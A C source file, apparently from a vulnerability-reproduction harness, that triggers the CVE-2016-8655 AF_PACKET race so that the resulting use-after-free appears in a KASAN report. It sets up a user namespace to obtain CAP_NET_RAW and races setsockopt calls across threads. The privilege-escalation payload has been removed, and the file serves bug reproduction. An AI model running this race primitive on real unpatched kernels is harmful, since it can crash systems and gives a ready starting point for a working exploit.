/*
 * CHAINFORGE KASAN crash-trigger for CVE-2016-8655 (CWE-362 race -> CWE-416 use-after-free).
 * NOT an exploit: strips the privesc payload from public PoCs (bcoles/chocobo_root, rebel),
 * keeps ONLY the race-winning primitive so the UAF in packet_set_ring() fires and KASAN
 * reports it. GOLD witness = the KASAN splat, observed under real SMP.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <linux/if_packet.h>

#ifndef PACKET_VERSION
#define PACKET_VERSION 10
#endif
#ifndef PACKET_RX_RING
#define PACKET_RX_RING 5
#endif
#ifndef TPACKET_V1
#define TPACKET_V1 0
#endif
#ifndef TPACKET_V3
#define TPACKET_V3 2
#endif
#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif

struct tpacket_req3_local {
    unsigned int tp_block_size, tp_block_nr, tp_frame_size, tp_frame_nr;
    unsigned int tp_retire_blk_tov, tp_sizeof_priv, tp_feature_req_word;
};

static int sfd = -1;
static volatile int barrier = 1;
static volatile int stop = 0;
static struct tpacket_req3_local tp;

static void *setsockopt_thread(void *arg) {
    (void)arg;
    while (barrier) {}
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void *)&tp, sizeof(tp));
    return NULL;
}

static void *vers_switcher(void *arg) {
    int val, x;
    (void)arg;
    while (barrier) {}
    while (!stop) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
        if (x != 0) break;
        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
        if (x != 0) break;
    }
    return NULL;
}

/* unprivileged AF_PACKET needs CAP_NET_RAW; get it via a user+net namespace */
static int setup_ns(void) {
    int uid = getuid(), gid = getgid(), fd, n;
    char buf[64];
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) return -1;
    fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) { write(fd, "deny", 4); close(fd); }
    fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd >= 0) { n = snprintf(buf, sizeof buf, "0 %d 1\n", uid); write(fd, buf, n); close(fd); }
    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd >= 0) { n = snprintf(buf, sizeof buf, "0 %d 1\n", gid); write(fd, buf, n); close(fd); }
    return 0;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (setup_ns() != 0)
        fprintf(stderr, "[cf] userns setup failed (%m); continuing\n");

    /* a valid V3 ring request: block_size >= frame_size, a few blocks */
    tp.tp_block_size = 0x1000;
    tp.tp_block_nr = 8;
    tp.tp_frame_size = 0x1000;
    tp.tp_frame_nr = 8;
    tp.tp_retire_blk_tov = 100;

    const int attempts = 40000;
    for (int i = 0; i < attempts && !stop; i++) {
        pthread_t t_set, t_ver;
        int val;
        sfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (sfd < 0) {
            if (i == 0) fprintf(stderr, "[cf] socket(AF_PACKET) failed: %m\n");
            continue;
        }
        val = TPACKET_V3;
        setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        barrier = 1;
        pthread_create(&t_set, NULL, setsockopt_thread, NULL);
        pthread_create(&t_ver, NULL, vers_switcher, NULL);
        barrier = 0;                 /* release both threads to race */
        usleep(50);
        stop = 1;                    /* signal switcher to stop this round */
        pthread_join(t_set, NULL);
        pthread_join(t_ver, NULL);
        stop = 0;
        close(sfd);
        if ((i & 0x3ff) == 0) printf("[cf] attempt %d/%d\n", i, attempts);
    }
    printf("[cf] done %d attempts (no crash observed in guest userspace)\n", attempts);
    return 0;
}